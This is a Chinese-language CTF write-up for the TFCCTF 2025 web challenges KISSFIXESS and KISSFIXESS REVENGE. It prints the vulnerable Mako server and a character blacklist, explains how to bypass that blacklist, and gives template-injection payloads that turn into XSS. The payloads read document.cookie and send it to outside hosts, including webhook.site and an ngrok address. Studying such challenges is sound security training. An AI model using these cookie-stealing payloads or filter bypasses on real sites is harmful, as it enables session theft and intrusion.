---
title: "TFCCTF"
description: "1. 对名字进行HTML转义（防止XSS攻击）"
publishDate: "2025-09-12T10:23:39+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/2b2230206a1bdf179011e394d9898e48.png"
categories: ["CTF"]
tags: ["tfcctf"]
---
# **KISSFIXESS**


```xml
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from urllib.parse import parse_qs
from bot import visit_url
from mako.template import Template
from mako.lookup import TemplateLookup
import os
from urllib.parse import urlparse, parse_qs
from threading import Thread

MODULE_DIR = os.path.join(os.path.dirname(__file__), 'templates')
if not os.path.exists(MODULE_DIR):
    try:
        os.makedirs(MODULE_DIR)
    except OSError as e:
        print(f"Warning: Could not create Mako module directory: {e}")
        MODULE_DIR = None

html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pixel Rainbow Name</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

        body {
            font-family: 'Press Start 2P', cursive;
            background-color: #222;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .container {
            background-color: #333;
            padding: 30px;
            border: 5px solid #555;
            box-shadow: 0 0 0 5px #444, 0 0 0 10px #333, 0 0 20px 10px #000;
            text-align: center;
        }

        h1 {
            font-size: 24px;
            color: #0f0; /* Green for a retro feel */
            margin-bottom: 20px;
            text-shadow: 2px 2px #000;
        }

        label {
            font-size: 16px;
            color: #ccc;
            display: block;
            margin-bottom: 10px;
        }

        input[type="text"] {
            font-family: 'Press Start 2P', cursive;
            padding: 10px;
            font-size: 16px;
            border: 3px solid #555;
            background-color: #444;
            color: #fff;
            margin-bottom: 20px;
            outline: none;
        }

        input[type="submit"] {
            font-family: 'Press Start 2P', cursive;
            padding: 10px 20px;
            font-size: 16px;
            color: #fff;
            background-color: #007bff;
            border: 3px solid #0056b3;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        .name-display {
            margin-top: 30px;
            font-size: 32px; /* Base size for rainbow text */
            font-weight: bold;
            padding: 10px;
        }

        .rainbow-text {
            /* Fallback for browsers that don't support background-clip */
            color: #fff;
            /* Rainbow effect */
            background: linear-gradient(to right,
                hsl(0, 100%, 50%),  /* Red */
                hsl(30, 100%, 50%), /* Orange */
                hsl(60, 100%, 50%), /* Yellow */
                hsl(120, 100%, 50%),/* Green */
                hsl(180, 100%, 50%),/* Cyan */
                hsl(240, 100%, 50%),/* Blue */
                hsl(300, 100%, 50%) /* Magenta */
            );
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent; /* Make the text itself transparent */
            /* Animate the gradient */
            animation: rainbow_animation 6s ease-in-out infinite;
            background-size: 400% 100%;
            text-shadow: none; /* Remove any inherited text-shadow */
        }
        
        .rainbow-text span { /* Ensure individual spans also get the effect if we were to wrap letters */
             -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        @keyframes rainbow_animation {
            0%, 100% {
                background-position: 0 0;
            }
            50% {
                background-position: 100% 0;
            }
        }

        .instructions {
            font-size: 12px;
            color: #888;
            margin-top: 30px;
        }

    </style>
</head>
<body>
    <div class="container">
        <h1>Pixel Name Display!</h1>
        <form method="GET" action="/">
            <label for="name">Enter Your Name:</label>
            <input type="text" id="name" name="name_input" autofocus>
            <input type="submit" value="Show Fancy Name">
        </form>

        % if name_to_display:
            <div class="name-display">
                Your fancy name is:
                <div class="rainbow-text">NAME</div>
            </div>
        % endif

        <p class="instructions">
            Enter a name and see it in glorious pixelated rainbow colors!
        </p>
        <p class="instructions">
            Escaped characters: ${banned}
        </p>
        <input type="submit" value="Report Name" onclick="reportName()">
        <script>
            function reportName() {
                // Get from query string
                const name = new URLSearchParams(window.location.search).get('name_input');
                if (name) {
                    fetch('/report', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ name: name })
                    })
                    .then(response => {
                        if (response.ok) {
                            alert('Name reported successfully!');
                        } else {
                            alert('Failed to report name.');
                        }
                    })
                    .catch(error => {
                        console.error('Error reporting name:', error);
                    });
                }
            }
        </script>
    </div>
</body>
</html>
"""

lookup = TemplateLookup(directories=[os.path.dirname(__file__)], module_directory=MODULE_DIR)

banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "import", "eval", "exec", "os", ";", ",", "|"]


def escape_html(text):
    """Escapes HTML special characters in the given text."""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("(", "&#40;").replace(")", "&#41;")

def render_page(name_to_display=None):
    """Renders the HTML page with the given name."""
    templ = html_template.replace("NAME", escape_html(name_to_display or ""))
    template = Template(templ, lookup=lookup)
    return template.render(name_to_display=name_to_display, banned="&<>()")

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):

        # Parse the path and extract query parameters
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)
        name = params.get("name_input", [""])[0]
        
        for b in banned:
            if b in name:
                name = "Banned characters detected!"
                print(b)

        # Render and return the page
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(render_page(name_to_display=name).encode("utf-8"))
    
    def do_POST(self):
        # Handle POST requests to report names
        if self.path == "/report":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            name = json.loads(post_data.decode('utf-8')).get("name", "")
            print(f"Received name: {name}")
            if name:
                print(f"Reported name: {name}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Name reported successfully!")
                Thread(target=visit_url, args=(name,)).start()
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Bad Request: No name provided.")
        else:
            self.send_response(404)
            self.end_headers()

def run_server(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):
    server_address = ("0.0.0.0", port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting http server on port {port}...")
    print(f"Access the page at http://0.0.0.0:{port}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        httpd.server_close()

if __name__ == "__main__":
    run_server()

```



1. 对名字进行HTML转义（防止XSS攻击）

2. 将转义后的名字替换到HTML模板中的"NAME"占位符

3. 使用Mako模板引擎渲染最终页面

```python
def render_page(name_to_display=None):
    """Renders the HTML page with the given name."""
    templ = html_template.replace("NAME", escape_html(name_to_display or ""))
    template = Template(templ, lookup=lookup)
    return template.render(name_to_display=name_to_display, banned="&<>()")# 这里进行渲染!
   
```

### 解法一：



* 模板渲染时注入了变量`banned="&<>()"`，这提供了生成黑名单字符（如`<`, `>`, `(`, `)`)的方法，通过`banned[1]`到`banned[4]`即可访问。

* 用大写标签名绕过小写s黑名单

* 用反引号作 JS 的字符串/属性访问（例如 ``window[`open`]、window[`document`][`cookie`]``），避免在 JS 中使用单/双引号

* 用模板变量 `banned[1..4]` 生成 `< > ( )`

* 用 ``window[`open`]`` 替代 ``window[`location`]`` 来发请求，绕过小写l黑名单

* 用 ``String[`fromCharCode`](46)`` 生成点号`.`

bot（在bot.py中）使用Selenium访问用户提供的URL，并且事先设置了名为`flag`的cookie。利用SSTI注入JavaScript代码，使bot的浏览器执行XSS，读取`document.cookie`并发送到攻击者控制的服务器。

#### Payload构造与绕过技巧

最终payload为：

```shell
${banned[1]+'SCRIPT'+banned[2]+'window['+'open'+']'+banned[3]+'http://xx'+'+'+'String[fromCharCode]'+banned[3]+'46'+banned[4]+'+'+'xxx'+'+'+'String[fromCharCode]'+banned[3]+'46'+banned[4]+'+'+'xx'+'+'+'String[fromCharCode]'+banned[3]+'46'+banned[4]+'+'+'xxx?c='+'+'+'window['+'document'+']['+'cookie`'+']'+banned[4]+banned[1]+'/SCRIPT'+banned[2]}
```



这个payload在Mako渲染时会被执行，生成以下HTML/JS代码：

```xml
<script>window[open](`http://xx`+String[`fromCharCode`](46)+`xxx`+String[`fromCharCode`](46)+`xx`+String[`fromCharCode`](46)+`xxx?c=`+window[`document`][`cookie`])</script>
```

#### 为什么`String.fromCharCode(46)`生成点号？

* `String.fromCharCode()`是一个静态方法，它返回由指定的UTF-16代码单元序列创建的字符串。

* 每个字符都有一个对应的数字代码点。在ASCII表中，点号（.）的ASCII码是46。

* 因此，`String.fromCharCode(46)`返回字符串"."。

#### 为什么能通过索引访问字符？

`template.render(name_to_display=name_to_display, banned="&<>()")` 这行代码将变量 `banned` 注入到 Mako 模板的渲染上下文中，其值为字符串 `"&<>()"`。在模板中，您可以通过 `${banned}` 来引用这个字符串，但也可以通过索引（如 `${banned[0]}`、`${banned[1]}` 等）来访问字符串中的单个字符。这是因为在 Python（Mako 模板基于 Python）中，字符串被视为字符序列，支持索引访问。

`String.fromCharCode()` 是 JavaScript 语言中的一个静态方法，属于内置的 `String` 对象。



### 解法二：Mako模板中的字符串格式化



我们可以使用 `%c` 格式字符串来构造字符。 `${'%c'%60}` 将产生 `<`&#x20;

为给定的字符串生成 payload：

```python
#!/usr/bin/env python3

banned = ["s","l","(",")","_",".",'"',"\\",";",",","|","&","<",">"]
payload = "<script>fetch('https://webhook.site/4c461515-2031-42bd-8c17-ab4734aa0d05/?c='+document.cookie)</script>"
final_payload = ""
for i in payload:
    if i in banned:
        val = str(ord(i))
        final_payload += "${'%c'%" + val + "}"
    else:
        final_payload += i

print(final_payload)
```

### tips：

* 生成括号：`String.fromCharCode(40)` 是 `(`，`String.fromCharCode(41)` 是 `)`。

* 生成单引号/双引号：`String.fromCharCode(39)` 是 `'`，`String.fromCharCode(34)` 是 `"`。这在引号被过滤时非常有用。

* 生成反引号：`String.fromCharCode(96)` 是 `` ` ``。

* 生成空格：`String.fromCharCode(32)` 是空格。

* Mako模板中的字符串格式化



## **KISSFIXESS REVENGE**

解法一：

```sql
banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "&", "%", "^", "#", "@", "!", "*", "-", "import", "eval", "exec", "os", ";", ",", "|", "JAVASCRIPT", "window", "atob", "btoa", "="]
```

```shell
${banned[1]+'SCRIPT'+banned[2]+'window['+'`open`'+']'+banned[3]+'`http://796397207/`'+'+'+'window['+'`document`'+']['+'`cookie`'+']'+banned[4]+banned[1]+'/SCRIPT'+banned[2]}

渲染后变为
${banned[1]+'SCRIPT'+banned[2]+'fetch'+banned[3]+'`http://796397207/`'+'+'+'document['+'`cookie`'+']'+banned[4]+banned[1]+'/SCRIPT'+banned[2]}

```



\<script>fetch(`http://796397207/`+document.cookie)\</script>

解法二：

```python
def render_page(name_to_display=None):
    templ = html_template.replace("NAME", name_to_display or "")
    template = Template(templ, lookup=lookup)
    tp = template.render(name_to_display=name_to_display, banned="&<>()", copyright="haha", help="haha", quit="haha")
    try:
        tp_data = tp.split("<div class=\"rainbow-text\">")[1].split("</div>")[0]
        if "." in tp_data or "href" in tp_data.lower():
            name = "Banned characters detected!"
            return name
    except IndexError:
        name = "Something went wrong!"
        return name
    return tp
```

渲染后，函数提取 `<div class="rainbow-text">` 和 `</div>` 之间的内容（即 `tp_data`），并检查是否包含点号（`.`）或 "href"（不区分大小写）。

由于检查只针对 `rainbow-text` div 内的内容，可以在 payload 开头添加 `hi</div>` 来提前闭合该 div。这样，后续的脚本标签就不会被检查。

* 例如：`hi</div><script>...</script>`，其中 `tp_data` 只会包含 "hi"，没有点号或 "href"。



```sql
payload = "hi</div><script>fetch('http://0.tcp.in.ngrok.io:17940/?'+document['cookie'])</script>"# Convert `.` characterpayload = payload.replace(".", "'+ String['fromCharCode'](46) +'")
payload = payload.replace("s", "S")
# '(' and ')' are available in banned variablepayload = payload.replace("(", "${banned[3]}")
payload = payload.replace(")", "${banned[4]}")
print(payload)
```

生成的payload

```bash
hi</div><Script>fetch${banned[3]}'http://0'+ String['fromCharCode']${banned[3]}46${banned[4]} +'tcp'+ String['fromCharCode']${banned[3]}46${banned[4]} +'in'+ String['fromCharCode']${banned[3]}46${banned[4]} +'ngrok'+ String['fromCharCode']${banned[3]}46${banned[4]} +'io:17940/?'+document['cookie']${banned[4]}</Script>
```







## Reference：

https://sakuraraindrop.github.io/2025/08/29/TFCCTF-2025/index.html#WEBLESS

https://h4r1337.github.io/posts/tfcctf-25/#kissfixess（博主写的很有详细👍）

https://bbs.huaweicloud.com/blogs/393192（Mako模板引擎以及沙箱机制）#精读


